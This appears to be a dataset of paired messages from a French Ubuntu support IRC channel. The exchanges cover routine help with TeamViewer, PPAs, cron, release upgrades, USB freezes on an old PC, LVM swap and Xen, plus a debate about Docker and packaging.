parce qu'il est pas dans les depots ?	ca depend du point de vue
merde, du coup il faut que je trouve une ligne de commande pour supprimer ce dossier .mediaart s'il est le seul truc de présent dans le dossier 😞	mais c'est pas dans les depots, et un blob pas libre pour prendre la main sur un ordi distant, comme en dire, ca devrait faire sonner quelques alarmes dans un monde post-snowden
ah bon j'étais persuadé que non :-) du coup quel est l'équivalent libre ? Sacahtn que je voudrais pouvoir accéder à mon ordinateur maison  de l'extérieur à tout moment.	il existe un fichier debian sur le site officiel au cas ou… https://www.teamviewer.com/fr/download/linux.aspx
Bonjour à tous, savez-vous pourquoi je ne trouve pas teamviewer dans la logitheque xbuntu ?	parce que c'est un logiciel proprietaire
tu peux remplacer -delete par -print ?	méa coulpa ;)
!paste	tu es sûr que les dossiers qui ne s'effacent pas sont non vides ?
pas pour debian ;)	un ppa, c'est un dépot personnel, s'il est prévu pour debian, il est pas pour ubuntu
impossible de s'inscrire sur le forum	les ppa c'est pour ubuntu ;)
piti je te remercie. OUi il me semblais bien ne pas être au bon endroit, Mais le site fr de bian impossible de s'inscrire dessus. Et comme les deux distrib sont proches, je pensais pouvoir tenter ma chance.	il y a des canaux irc aussi: #debianfr ici (freenode) ou #debian-fr sur oftc
Pas sur d'être vraiment au bon endroit. J'ai installer une debian en virtuelle, et je souhaitas ajouter un ppa. Mais la commande add-apt-repository ou apt-add-repository me retourne commande introuvable	c'est pas le bon endroit, mais aussi, les ppa sont pas intégrés à debian comme ils le sont à ubuntu
quelqu'un de dispo pour moi???	expose plutôt ton problèm
là c'est un appareil photo qui était parfaitement reconnu avant	quel modèle ?
la doc n'est pas énorme sur le retour aux cersions précédentes.	parce que ce n'est pas prévu
entre autres pbs avec la 15.04, les périphériques usb ne sont pas reconnus.	lesquels ?
Petite question : etant passé à ubuntu 15.04 par erreur (confondu mise à niveau et mise à jour) je souhaiterais revenir à la version stable précédente. est-ce possible ?	tu avais une lts avant ?
bonjour	difficilement
oups, je suis toujours là	c'est dans quel cas que tu tente de faire ca
sinon mes gamines vont m'en vouloir	elles jouent à quoi
C'est peut-être à cause de la migration des serveurs (mais je pensais qu'elle était finie)	il y a des soucis de connectivité en cours, ils check
je transmets	nop.
donc ce que vous me dites, c'est que ça lit ligne par ligne comme du PHP et que j'ai juste à mettre une autre action à la suite ?	"&&" s'assure que la commande précédente s'est achevée correctement, via son signal de sortie, avant d'exécuter la suivante
pourquoi tu souhaites voir la sortie de ton script dans une console ? cron automatise des tâches, si tu veux du log tu peux regarder dans /var/log et si tu veux voir la sortie de ton script t'utilises un fichier temporaire	j'ai déjà eu ma réponse sur le sujet mais je te remercie
moi je fais des echos dans le bash	donc ça affiche sur la sortie standard
Bonjour, comment fais-t-on pour, lorsqu'on lance une tâche cron, afficher les echos du bash dans la console s'il vous plaît ?	normalement cron envoi un email en local si tu as de l'affichage sur la sortie standard
Est ce que quelqu'un peu m'aider?	http://doc.ubuntu-fr.org/conduiteirc
 bonsoir à tous. J'ai un problème avec mes application Kde, je n'arrive pas a acceder à l'aide "manuel d'utilisateur" de chaque application. à chaque fois la fenetre d'aide démarre et m'affiche "Cannot Initiate the help Protocol"	on sait lire flood pas
on sait lire flood pas	ok
commandes exécutées	pour les paquets /var/log/apt/history.log
comment puis-je avoir un journal des modifications apportées à mon OS ?	quels genre de modification?
ça existe ubuntu server hein	quelqu'un a mis a jour de Windows 1.0 à Windows 8.1 :D
imagine une mise à niveau de windows XP à windows 8 en passant par windows 7	j'étais en 14.04, je veux arriver sur la dernière release
avec sudo do-release-upgrade j'aurai ptet pu faire 14.04 → 15.04 directement mais pas trouvé cette commande avant	c'est surtout assez inutile de passer de 14.04 à 15.04
bah de rien , désolé de pas avoir trouvé la solution	Tu rigole ou quoi ! pas de desolé !
vu que tu as fait pas mal de manip'	 mais après une bonne pause lol
fait une reinstall	oui je vais essayer
c'est pas ça , mais faut maitriser un minimum	oh oh...
ouais mais les netinstall bon.....hem...	c'est pas stable ?
le live oui, mais pas le system embarqué	 la poussière ? x:
si le DD posait probleme , tu booterais pas du tout	ah...
mais avant de brûler l'ordi et de danser nu autour	hahaha (X
ça sent le sapin mec :(	non plus serieusement... je suis lessivé là lol
bah là ....	j'aime bien l'odeur des sapin x:
on serre les miches , lol	 flop >.<
ouais vazy	et c'ets le freeeeeeez !!!!
quel system de fichiers ?	la je crois qu'elle est en ext4 ? je sais pas trop enfaite, je l'ai formaté en utulisant un logiciel qui fait des LiveUSB tu sais ?
elle est sous quelle format ?	 je suis sur le bureau de xubuntu là... je vais inserer la cléf... *roulement de tambour !*
petite question, ta clef , quand tu l'insère sous win7 , no problem ?	oui aucun problème
bah au moins sur le live xubuntu tu pourras faire un " lsusb " , mouarf	a condition que ça ne freeze pas a l'insertion de ma clé lol
et pas un probleme inhérent à ton systeme d'exploitation ^^	a mona vis ça m'ettonerai que ça fonctionne sur xubuntu si ça n'a pas fonctionner sur Gparted T.T
si ça marche pas sur un live de gparted, ni sur un live de xubuntu, alors tu peux te dire que c'est un probleme matériel	flop... ça craint ça...
ça vaut le coup	je comprend... ok je fait le test
oui , et tu teste ta clef	 il me semble avoir essayé... et pareil ça freeze en mettant la clé, mais je vais reessayer j'ai un doute
bohdi....mouarf, nan utilise xubuntu	tu veut que je boot sur le CD ?
tu l'as toujours ?	j'en ets plusieur j'ai xubuntu, lubunte et même bodhi linux
tu avait installé ubuntu depuis cd ou clef ?	le cd de xubuntu ? Lubuntu ?
surtout si ça marchait avec windaube	depuis liveCD
ouais , m'enfin 6 ports cramés ...hum	après windaube c'etais il y a moment, ça ce trouve j'ai cassé un truc en tre temps sans même m'en rendre compte... mais je sais pas j'en doute );
rien d'autre ?	lol ... en effet...
y'a quoi ?	 rien d'autre... que ça ):
en haut à droite, le menu deroulant	mon disque dur "/dev/sda
non , elle devrait apparaitre anyway	ouais je me disais aussi..
oui ?	je veux dire, je 'laurais vu quand même dans gparted ou même pas ?
ferme gparted ( la fenetre , pas un reboot )	eum... la cléf usb que je viens d'utiliser, je 'lai formaté tout a l'heure et j'en ets fait un live usb ubuntu 15.04... ça serait pas ça le hic ? lol
ferme la console	 juste une question avant de faire ça....
lsusb , verifie bien ^^	 hmm... franchement j'ecris bien " lsusb" sansles guillet et toujour comand not found o:
est ce que tu vois la clef ?	 oups il trouve pas la command o:
menu ==> actualiser les periphs	voilà c'estf ait... et toujour parreil
ah ben oui, pas de clef wifi , mdrrr	hm ba apparement non elle y est pas
en haut à droite tu dois avoir un menu deroulant ^^	lol
ok tu vois ta clef ?	hmm... non mais c'ets une clé wifi en même telmps attend je vais plutot branché une clé de stockage
clic droit	 ah oui ok !
desolé, mon chat ^^	 lol la classe ! (X
gyhnji741	 le menu ? eum.. lequelle ? x:
:)	 Ok je suis sur le bureau de gparted !
nan mais laisse lui le temps de booter, mdrr	 (ah mais oui jsuis bête "keymap" ... c'est la disposition des touche -.- )
oui c'est la config du clavier	 ah ok bon je vais sur le bureau alors
oui , dis moi quand tu seras sur le " bureau "	 la tu vois ile me parle d'un truc de keymap, ça te dit quelque chose ?
oui gparted live	 la il y un peu de code qui defile...
adrienbox , MM = muted et 00 = enabled	ok
ok vazy	merci !
^^	je reboot dessus pour que tu me dise ? x:
alors tu vois ta clef ?	eub ba enfiate la du coup j'ai rebooter lol j'ai rien compris ghparted lol
re speendash	re camarade !
à toute	La je suis dans Gparted et en ayant mis la clé USB wifi ça ne freeze pas o: !
quand je vais sur alsamixer certain truc sont en MM certain sont en 00	Je suis un gros debutant , donc je ne pense pas que je pourrais t'aider... mais patience il y aura surement quekqu'unici qui pourra t'aider (:
j'ai un problème de son sur ubuntu	Bonjour !
note les erreurs s'il y en a	 ok ça amrche (excuse moi je rpeondait au post, j'essaye ça ! merci pour ton aide et a toute j'espère (:
combien de ports usb ?	et il a 6 ports USB
il date de quand cet ordi ?	 je suis pas sur car c'est un ordi que j'ai recupérer a de la famille... je dirais 2004, 2005 peut être ?
tuvas avoir le même probleme , et tu pourras pas paster vu que tu n'as pas de co internet ^^	ah flop... bon ba je vais leur expliqué ça lol
donc non , pas plus d'idée pour le moment	ok pas de soucis, la je vais essayer ce qu'ils viennent de me conseiller de faire sur ce post : http://forum.ubuntu-fr.org/viewtopic.php?id=1843711&p=2
pas grave , ça te servira toujours un cd live de parted	ta une idée ?
je réfléchis à un truc	 oui exacte (:
attends	 trop tard lol
erf, ça suxx de prendre un DVD -R juste pour ça mais bon	bon flop tempis je retrouve pas... aller hop R.I.P le dvd -.-
bah prends un CD RW	 attend je regarde lol
allez essaye avec le live de Gparted , on verra ensuite ^^	.... ah ! mais je crois j'en est un en plus o: !!
ouais enfin reinstaller xp ça résoud pas le probleme, ça l'aggrave XD	 bon aller c'ets partie pour gparted c'est bon hein ? tes sur de toi ? je peut lancé et gacher un dvd de plus lol ?
tu as installé Lubuntu sur cette tour , mais est ce que tu as conservé Winxp oopa ?	carrement lol, c'etais juste pour voir si ça fait le soucis aussi avec XP ou pas
je pense à un truc	 non je l'ai remplacer par xubuntu depuis belle lurette a lepoque, mais j'ia toujour le dvd de XP, je pensais justement a ça faire le test. je peut reinstaller, puisque j'ai sauvegarder toute mes donnée
tin c'est une tour de 1983 ?? mdrr	je reviens je vais faire la gravue (:
grave Gparted , boote dessus et insère ta clef en facade	hahaha (X eba elle a les port mais la carte mère non lol
ok ok ... en fait rien ne marche en usb quoi ^^	 j'ai pas de port en façade lol
il est dans la même piece que ton portable , non ? lol	 oui exacte... ):
mais , question subsidiaire, ton pc " probleme " , tu peux pas le connecter via eth ou wifi ??	1er ligne :   [    1.211202] usb usb5 : manufacturer : Linux 3.13.0-53-generic uhci_hcd     2ème ligne : [    1.211206] usb usb5 : SerialNumber: 0000:00:10.3
Oo	la box est en abs elle
paste moi les deux dernières lignes seulement	 le PC portable lui est en wifi
hum...	Wifi non car la clef wifi usb fait freeze le PC donc ça fcontionne pas, aprcontre ethernet çaa foncitonne mais faudrais que je redescende le l'ordi en bas... (et le padre va encore faire la tronche lol )
erf	oui parce que la je suis avec mon pc portable, le windows 7
ctrl + alt +f7	en plus j'ia essayer tout a l'heure de genre partagger en ethernet la conexion wifi de mon PC portable win 7 et quand j'ia relier les deux çaa aussi provoqué le même type de freeze...
et donne le lien :)	 ah mais je suis trop bête ! je peut pas le mettre sur pastebin ! j'ia pas internet dessus ! >.<
poste le resultat sur pastebin	 Merci ! (:
ok	ça ce trouve c'est a cause des mouton qu'il ya dans l'ordi... mes yeux me gratte sévère la lol
tu as d'autres periphs en usb à part souris / clavier ?	ba enfaite là dans l'immediat non, le clavier et la souris sont en PS/2
bon reboot et donne le résultat de la commande via pastebin ( pas içi hein )	 ok  !
clavier usb ?	 oui tout... clavier et souris
ok : dmesg | grep usb	la faut que je reboot, c'ets toujour freectrl + alt + f2 focntionne pas...
puis tape : dmesg	j'ai redemarer le lordi après avoir fait la nip et ensuite arirvée j'ia branché la clé
puis ça a freezé ?	 exacte oui
ben de rien ... vois déjà si ça marche ᴖ_ᴖ	 la je commence a pensé a une autre idée... vu que j'ia changer de disque dur recement... ça serait pas mon disque dur qui provoque un conflit ou je ne sais quoi ? o:
bon je pars bosser dans 2min	 et flop parreil ça freeze au branchement de la clé wifi USB...
:þ	ba en tout cas merci de ton aide !
et si tu as du temps à perdre installe en plus une gentoo	 oh flop ! dommage -.-
fait*	tu t'en sors ?
tu t'en sors ?	 oui hehe, désolé je tapais le truc sur l'autre ordinateur, comme je peut pas faire copier coller ça me prennais un peu plus de temps
là tu apprends ᒃ‿ᒄ	slackbuilds sans gestion de dependances , il y en a que qlq uns qui font ca
tester la 14.04 LTS par exemple	eskull le meilleur moyen d'apprendre
et pour les " noobs " c'est pas l'idéal non plus	+1
grave la netinstall c'est la meilleure	Bonjour ! la netinstall ? c'est quoi ça ? o:
Bonjour ! la netinstall ? c'est quoi ça ? o:	c'est pour ca que je n'installe pas des cd tout fait , je prefère la netinstall.
c'est pour ca que je n'installe pas des cd tout fait , je prefère la netinstall.	j'ai jamais essaye j'avoue... a voir
oui	 ok j'enlève et je fait la manip que tu ma dit
enlève là	ah j'enlève ce que 'jai rajouté alors
oui	 ah ? comment je fait ça ?
par contre remets ton grub en état inital	"nano /etc/default/grub" je tape ça dans l'emulteur de terminal c'est ça ?
reboot et teste	 je sais pas si c'ets interessant mais j('ai ce qu'on ma dit de faire dans le post #2 de ce lien : http://forum.ubuntu-fr.org/viewtopic.php?id=1843711&p=1
 je sais pas si c'ets interessant mais j('ai ce qu'on ma dit de faire dans le post #2 de ce lien : http://forum.ubuntu-fr.org/viewtopic.php?id=1843711&p=1	heu pas la même chose là
heu pas la même chose là	 ok je voulais juste te montrer au cas ou ça a une quelqu'onque pertinence... je suis un gros nood dans linux moi -.-
tu pense un probleme I/O peter ?	ouep
<McPeter> nano /etc/default/grub	re camarade ! que medisais tu de faire tout a l'heure ?
il va rejoin, tkt pas	 ok (:
nano /etc/default/grub	ah ta bien fait de me prevenir j'allais klancé lma gravure lol
tu as combien de swap ?	 la pour ubuntu en swap j'ia mis le bouble 1024Mo
la ram	eskull  même xubuntu, ça fonctionnais nikel pour mon vieuw pentium 4 (:
lubuntu ça tourne large avec 512 peter	oui et non
-s+t	 o: ?
attends :(	Non en 32 bit je pense parce que j'ai 512Mo de ram
vas y SpleendaSh , essaye avec le gparted live	la je vazis graver gparted
ᒃ⁔ᒄ	 Oui x:
o_O	 lol c'est de la folie mon ordi ? (X
et de là insérer ta clé	oui j'ai essayer ça exacte, et ça freeze quand même des que j'insère la clef...
Ctrl+Alt+F1	 ah j'ai erssayer ça en faisant ctrl + alt + F1 ?
no problemo	 merci pour ton aide, le je telecharge je grave et j'essaye
oui même un cd fera l'affaire	Ok je vais regarder un instant (:
Gparted live cd ==>> google it  :)	le problème c'est que je suis short en dvd là... faut que je regarde si j'en ets quelque par un vierge qui traine...
grave le live cd de Gparted	 gparted ?
ah ok	j'avoue être assez paumé lol, sinon pour info je sais pas si ça peut être lié mais la juste recemment j'ia decidé de changer de disque dur o:
dans le menu " periphériques internes "	Oui j'ai regarder ça tout a l'heure c'est ce qu'on ma conseillé et tout est sur Enabled
tu as installé Lubuntu avec le live cd, pas de problemes particuliers lors de l'installation ?	Oui en LiveCD et non aucun problème, j'ai essayer de faire un teste en LiveUSB tout a l'huere de Lubuntu 15.04, ça a freez avant même d'arriver a l'installateur...
encore une question, cela te fait ce probleme depuis toujours ou ça a deja fonctionné ?	 Au debut c'etais pas trop grave, juste que la clé USB ce reconaissait pas alros il fallait reboot ou des fois ma souris au demarage etais pas detecté alors qu'elle est alumé...
si tu branche une autre clef, as tu le même probleme ?	Enfaite j'ai eu des bug comme ça a partir d'après être passé de Windows XP a xubuntu... avant ça ne me faisait pas ça
sans les quotes :)	 oui... j'ai essayer avec deux clé Wifi USB différente et deux Clé USB de stockage différente et j'ai eu le même freeze pour les 4
ou encore avec un " sudo fdisk -l "	On dirait que j'injecte de la cryptonique a superman des que je branche une clé usb lol
elle appareit avec " lsusb " en terminal ou pas ?	 ba le truc c'est que je ne pourrais même pas essayer car si je la branche, le système freezera et je ne pourrais rien faire d'autre ):
je présume que tu as essayé sur d'autres ports usb de ton ordi ?	 j'ai aussi essayé avec d'autre clée USB de stockage et même resultat...
Bonjour tout le monde ! (enfin re enfaite) est-ce que qeulqu'un aurait une idée d'ou viendrais un problème de freeze chaque fois qu'une clée USB est branché a l'ordinateur ? (je suis sur Lubuntu 14.04 pour info)	est ce que ta clef est reconnue ou pas du tout ? tu peux la monter ou ça freeze direct avec une erreur ?
est ce que ta clef est reconnue ou pas du tout ? tu peux la monter ou ça freeze direct avec une erreur ?	 oui et même resultat... ):
salut scorp	 Lorsque je demare lordi avec la clé de brancher dessus, c'est aléatoire des fois ça freeze avant même que je puisse accéder au système et des fois j'arrive au système mais la clé Wifi ne semble pas être detceté...
plop	Bonjour camarade ! merci de ton aide (: - enfaite il n'y a aucun message d'erreur, l'rodinateur freeze complètement et je suis obliger de hard reboot ):
une idée ?	avant tu etais en quelle version de ubuntu ?
avant tu etais en quelle version de ubuntu ?	15.04
j'essaie juste de trouver des manières de s'informer sur ce qui se passe :)	je comprend oui (: je te remercie pour ton investissement ! (:
et connecte ta clé ensuite, pour voir si ce ne serait pas un service lancé en graphique qui bloque le système	des que je branche la clé wifi en effet tout ce bloque, cepandant, le système ne freeze pas si la clé et conecté avnt le demarage de lordinateur ? seulement a clé ne semble pas detecté je crois
hm...	est-ce que tu aurais une autré idée ? x:
ok	Voilà je viens d'essayer et sa freeze aussi en tty...
des fois F8, si tu as eu des trucs étranges et que X n'est pas sur le 7	1er essaie, la je viens de vranché la clé wifi et le système a donc freeze et rien ne ce passe lorsque je fait ctrl + ALT + F1 (tout semble complètement freezer) je vaiqs redemarer et essayer en passant dabbord en tty (:
si ça ne fonctionne pas, essaie de faire l'inverse : passe d'abord en tty, et connecte ta clé USB ensuite, pour voir si le freeze vient du mode graphique, ou pas	 ah daccord... non jamais essayer, laisse moi faire le test tout de suite (:
tu fais Ctr+Alt+F1, ça devrait t'envoyer dans une console hors du mode graphique	passer en TTY ? eum... qu'est-ce que ça signifie ? x:
je me demandais peut être si il ne faudrais pas que je reinstalle un driver ou autre...	quand l'ordinateur est "freezé", tu as essayé de passer en tty ?
oui sur archlinux	ce ne sera plus vraiment Ubuntu, justement
celui-là, notamment	non l'idée n'est pas de tester mais de tourner avec gnome 3.16
non l'idée n'est pas de tester mais de tourner avec gnome 3.16	l'as-tu tester avant ?
http://sourcedigit.com/15453-download-and-install-gnome-3-16-on-ubuntu-14-1014-04-systems/	donc si je me rejoute les ppa c'est good ?
je n'ai pas de .desktop pour mon logiciel dans /usr/share/applications ...	balances un find dessus
svp un petit coup de main sur apache 2.4	?
ou /usr/local/share/applications	ce menu n'est pas regénéré au démarrage .
Bonjour j'ai un petit soucis avec un logiciel que j'ai installé manuellement et que j'essaye de désinstaller	sudo make uninstall?
J'ai aussi un problème avec mon DD où j'ai mis une partition LVM : elle n'est pas auto-montée lorsque je branche le disque dur... Une solution ?	t'as formatté comment cette partition?
t'as formatté comment cette partition?	Tout doit être dans la partition FAT réservée à l'UEFI
Tout doit être dans la partition FAT réservée à l'UEFI	maintenant je comprends , je ne peut pas t'aider sur uefi, desolé.
maintenant je comprends , je ne peut pas t'aider sur uefi, desolé.	avec gparted en mode lvm2 pv, puis j'ai lancé les commandes de création de volume/partition ici https://doc.ubuntu-fr.org/lvm
Une autre question :	on ne boot pas sur un lecteur logique.
on ne boot pas sur un lecteur logique.	Je ne saurais pas dire comment ça fonctionne, mais sur mon système actuel je n'ai que des partitions LVM et tout roule !
Je ne saurais pas dire comment ça fonctionne, mais sur mon système actuel je n'ai que des partitions LVM et tout roule !	ta cession live comporte un bootstrap et un grub qui ne peuvent etre logical.
oui à quelle question ?	le swap  doit etre sur lecteur logique.
et je déteste avoir l'erreur "disque plein"	et tu pense que le live cd prendera ton swap en compte?
et tu pense que le live cd prendera ton swap en compte?	Oui il le prend
mais si on s'appele yahoo ou fessedebook oui.	Vu que je prévoie de l'utiliser sur un DD externe pour une session live c'est probable que la swap soit utilisée
Vu que je prévoie de l'utiliser sur un DD externe pour une session live c'est probable que la swap soit utilisée	cession live?
cession live?	en live CD oui
Hum vu que ça rajoute une couche d'abstraction je me disais que ça pouvais produire des temps d'écriture plus long ce qui est embétant vu que la swap se veut être le plus rapide possible	prevoit d'y mettre au moins le  double de la Ram, et je ne pense pas que son utilisation depasse les 0.5%.
Does anyone knows if it's a good idea to put a swap partition on an LVM partition ?	we speak french here.
bonne chance :p	dison que ca fait un mois que c'est sortie donc bon ca devrait etre bon.
malheureusement il n'est pas possible de downgrader, sans réinstaller	Oui je sais bien, Bon elle fonctionne quand meme bien cette 15 ?
bref, il te reste 1 mois	a zut, j'etais en lts j'ai fait le noob je suis passé en 14.10
J'en profite égalment Ubuntu Sur un mac bookpro 2014 ca fonctionne bien ?	vu que tu utilises la 14.10, tu es censé migrer.
clache ?	Je voudrais en savoir plus sur ton projet, mais faisons-le en privé.
bref...	Pas par mail, mais il y a le forum.
ok. bon à savoir.	Testes flash, ce n'était qu'une police de caractères.
aie : W: L'opération a été interrompue avant de se terminer	Avec une clé live, j'enregistre mes fichiers dans un dossier que je mets dans la racine. Mais il faut être ordonné pour faire ça sans rien mélanger. ;-)
ok pour le reboot.	Mais je ne suis pas devant ton écran... :-/
normal ?	Je dirais non.
pas de souci.	Oui, reboot FF, même si les dernières versions n'en ont plus besoin.
question bete et je pense connaitre la réponse.	Oui, c'est le but. Mais les fichiers que tu enregistres ne seront pas accessible sous windows.
je tente... !	Je conservais ma clé en live, car la persistance ne me convenait pas. Mais je réinstallais flash à chaque boot du coup...
moi y en a etre novice :)	Ah? Car lorsque j'oubliais de le faire en live, il trouvait pas les paquets ce qui me semble normal.
merci.	Fais sudo apt-get update
oki, j'avais fait la recherche en vitesse sans me souvenir du nom, ne l'utilisant pas pour moi, je n'ai pas retenu :p	C'est ça.
car si il n'a pas de souci pour installer flash, il ne doit pas en avoir pour installer h.264 et mp3	Les options sont bien, sauf qu'il faut la relancer à chaque fois(clic-droit)que tu retournes sur la page. S'il y avait une fonction pour dire, sur la page X, tu appliques telle règle, ça éviterait de devoir la reprogrammer à chaque fois.
Les options sont bien, sauf qu'il faut la relancer à chaque fois(clic-droit)que tu retournes sur la page. S'il y avait une fonction pour dire, sur la page X, tu appliques telle règle, ça éviterait de devoir la reprogrammer à chaque fois.	tu es sur que c'est avec moi que tu en causais ?
tu es sur que c'est avec moi que tu en causais ?	Oui, mais c'était il y a bien plus d'un mois. ;-)
merci	xubuntu-restricted-extras plutot, ca fixe pas mal de questions de ce genre d'un seul coup
xubuntu-restricted-extras plutot, ca fixe pas mal de questions de ce genre d'un seul coup	+1, c'est encore mieux t'as raison
je m'absente quelques minutes...	sudo apt-get install flashplugin-installer
le mieux c'est de me poser les questions en pv et je répondrai quand je viens	Ca marche.
après pour les détail je délégue, je fait plutot du kvm perso ;)	Pas de soucis merci quand même :)
et dans ces cas là, tente de faire du kvm si tu en a la possibilité ;)	ca ne m'arrange pas sur ce serveur car les autres vm qui fonctionnent sous linux sont configurés avec xen mais je pense qu'il doit avoir une solution, je ne pense pas être le seul dans ce cas
ca ne m'arrange pas sur ce serveur car les autres vm qui fonctionnent sous linux sont configurés avec xen mais je pense qu'il doit avoir une solution, je ne pense pas être le seul dans ce cas	je précisais juste dans le cas d'une nouvelle installation ;)
Salut, quelqu'un connais un bon tuto sur xen pour créer une vm windows avec la version 4.4 de Xen ? Parce que j'ai un souci, j'ai réussi à créer ma vm mais windows n'a pas de réseau alors que lorsque j'était sous xen 4.1 ca fonctionnait sans problème avec les mêmes config	/!\ tu pourras faire que de la virtua intégrale
:)	l'argent et ceux qui rapportent de l'argent sont indispensable diplome ou pas tt disciplines confondues
si, Steve Jobs et les One Directions	oups, exact
j'en connais qui se specialisent direct sur la finance sans passer par les etudes.	chacun ses choix, perso j'apprecie de pouvoir me regarder dans une glace le matin en me levant
du moins ça fait parti aussi de la réalité	1/ c'est pas nouveau  2/ personne n'oblige personne à aller s'entasser sur paris  … je connais quelques etudiants qui arrivent à s'en sortir dans une colloc, avec une bourse et un boulot dans le service ou comme prof de musique/info ou webdev simple
dans un société où les études sont quasiment un luxe et ou bien souvent ne correspondent pas à une réalité du monde professionnel	ils sont dits-plômés mais ca reste des dire tt .. les dire des gens.
à l'heure de l'internet et du flot d'informatique et de documentation disponible sur la toile, un diplôme à t'il réellement une valeur attestant de connaissances ?	bcp de metiers ont disparus a cause de ca mais c'est positif.
67 ans	sysadmin, c'est pas "la" branche la plus complexe, c'est une branche parmis d'autres
sysadmin, c'est pas "la" branche la plus complexe, c'est une branche parmis d'autres	juste en bas dans la hierarchie tu as quoi, administrateur réseau ?
juste en bas dans la hierarchie tu as quoi, administrateur réseau ?	y a pas de hierarchie, c'est tout aussi absurde de dire qu'il y a une hierarchie dans le medical, je t'assure que pour assurer des soins tu veux une infirmiere plutot qu'une medecin, et l'inverse si tu veux un diagnostique
y a pas de hierarchie, c'est tout aussi absurde de dire qu'il y a une hierarchie dans le medical, je t'assure que pour assurer des soins tu veux une infirmiere plutot qu'une medecin, et l'inverse si tu veux un diagnostique	je vois ce que tu veux dire, mais tu sais, d'un métier à un autre, ils demandent un diplôme > donc des annees d'étude en plus
je vois ce que tu veux dire, mais tu sais, d'un métier à un autre, ils demandent un diplôme > donc des annees d'étude en plus	ca c'est le probleme de la société, pas le mien
mais rien que ça le sujet est vaste, et c'est pas facile de rassurer les gens avec la pseudo sécurité des communication	plus tu as une utilisation "bureautique" (web, mail, office, photo), plus la migration entre OS est simple, les migrations compliqués sont pour les gens qui ont un niveau "avancé sur un seul OS" alors qu'ils estiment avoir un niveau "avancé en informatique en general", ce qu'il les oblige a beaucoup se former pour recuperer leur niveau sur un nouvel OS, ce qui est souvent vecu comme une
voilà exactement :)	la mienne aussi :P
la mienne aussi :P	comme quoi ;)
perso, je risque de faire de la formation à l'utilisation de systèmes libre et en particulier ubuntu... je sais pas si ça peut marcher mais y pas mal de gens qui sont perdu rien que dans l'utilisation basique de l'ordinateur... sans aller dans trop de complexité rien que de s'y retrouver avec un ordinateur et la vaste toile...	ma mere utilise ubuntu
Oo	bein un peu quand même, je parle sur Paris, à chaque que j'explique que j'utilise Ubuntu, j'ai l'impression de "perdre" mon interlocuteur
c'est clairement un métier	il y autant, sinon plus, de variation entre les metier de l'informatique et les metiers du medical
ça me semble bien compliqué tous ça... c'est la qu'on s'aperçois que l'informatique est bien compliqué et pas à la porté de tous...	non, ce sont DES metiers
comment sortir de la pensé magique/système à boite noir sur ubuntu pour êre capable d'analyser ce qui se passe pour être dans le compréhension de sont OS et non façon à un sentiment de complexité incompréhensible	bof, c'est comme dire que la voiture c'est trop compliqué, car faire du rally c'est pas à la portée de tout le monde
salut	tu veux dire qu'on pourrait en faire un métier ?
mais bon, j'attends toujours de voir quelqu'un tenir se discours en ayant du Docker en prod	c'est comme le cloud: plus besoin de sysadmin
c'est comme le cloud: plus besoin de sysadmin	yep … sauf pour gerer le cloud et l'utiliser
la solution magique c'est les containers	le truc, c'est surtout de pas voir ce truc comme une solution magique
le projet roule 3 mois, on passe des mises à jour auto des paquets de la distro et des modules collés dedans à l'arrache	je suis assez d'accord avec l'article mais faut dire que les arguments sont bidons quand même. le container tu peux le créer toi-même from scratch, pas obligé d'en récupérérer des tout faits
je suis assez d'accord avec l'article mais faut dire que les arguments sont bidons quand même. le container tu peux le créer toi-même from scratch, pas obligé d'en récupérérer des tout faits	tu veux rire? à part dans les start_up de 3 personnes, c'est jamais le meme qui finalise le conteneur et qui le deploie en prod
si tu veux etre un peu plus restrictif	leur but c'est d'avori le même environnement de prod en dev dans un container et de n'avoir qu'à déployer ce même container, mais c'est pas encore vraiment au point je te l'accorde
leur but c'est d'avori le même environnement de prod en dev dans un container et de n'avoir qu'à déployer ce même container, mais c'est pas encore vraiment au point je te l'accorde	c'est pas que c'est pas au point, c'est conceptuelement une mauvaise idée, lis le lien qu'a balancé piti
je crée des conteneurs vides, et j'installe un client Salt dessus, puis Salt se débrouille pour tout mettre en place tout seul comme un grand	tout ce que j'ai vu en service docker, c'est du "projet jettable", quelqu'un qui monte un POC ou une demo pour vendre un projet, et 6 mois après doit tout reprendre à zero car c'est pas maintenable, c'est un bon outil de dev, pratique pour partager son env de test, meme si je prefere vagrant pour ca (plus par habitude / obligation de bosser avec des gens sous n'importe quel OS)
tout ce que j'ai vu en service docker, c'est du "projet jettable", quelqu'un qui monte un POC ou une demo pour vendre un projet, et 6 mois après doit tout reprendre à zero car c'est pas maintenable, c'est un bon outil de dev, pratique pour partager son env de test, meme si je prefere vagrant pour ca (plus par habitude / obligation de bosser avec des gens sous n'importe quel OS)	je n'ai jamais utilisé, ni même installé Docker :D
Existe-t-il une commande auquel nous écrivons en paramètre le fichier qu'on veux ouvrir, et que la commande se charge de l'ouvrir avec le programme par défaut associé? :)	xdg-open
et moi je parle du conteneur dans le sens "vm" :)	docker propose les deux, mais oui la deuxième méthode est plus sûre, plus flexible
si c'est la première solution, j'en veux pas, si c'est la seconde, c'est déjà ce que je fais	je ne parle pas du conteneur comme alternative à une VM, mais comme blob binaire à deployé
je ne parle pas du conteneur comme alternative à une VM, mais comme blob binaire à deployé	oui, j'avais compris ^^
oui, j'avais compris ^^	par contre le "on fait nawak sans policy" et on propose ca comme alternative au packaging en appelant ca docker ou snappy, bah j'y crois pas, et je ne veux pas avoir à en gerer, et j'en ai pas vu l'ombre de viable en prod
apres c'est à la mode, y a qu'à voir snappy, c'est juste que tous les projets serieux que j'ai vu passer sur le sujet ce sont complement carottés bien avant de passer en prod	leur philosophie c'est quand même de n'avoir que des containers sur ta bécane et les traiter comme si c'était des paquets :p
donc je m'accorde le droit	on a pas compris ce qu'a dit white_bear de la même manière ^^
on a pas compris ce qu'a dit white_bear de la même manière ^^	le LVM comme alternative à KVM, j'ai rien contre, chacun fait en fonction de ses besoins/resources materiels
j'ai des machines avec plusieurs instances de la même appli, et toutes les instances n'utilisent pas toujours les mêmes versions d'un même module python, donc venv	c'est que tu ne subies pas des conf toutes les deux semaines avec des zozos qui presentent les conteneurs comme la solution ideales pour remplacer le packaging
oops	on est vendrdi, et il provoque
si c'est juste pour tester, un chroot c'est jetable	faut pas tout melanger, un chroot c'est pas un conteneur
je verrai, mais à chaque fois que je me suis penché sur le packaging, ça a lamentablement échoué	la doc de Lucas est à jour pour se faire la main en vitesse: https://www.debian.org/doc/manuals/packaging-tutorial/packaging-tutorial.en.pdf … pour aller au delà le plus simple est de bouquiner la debian-policy
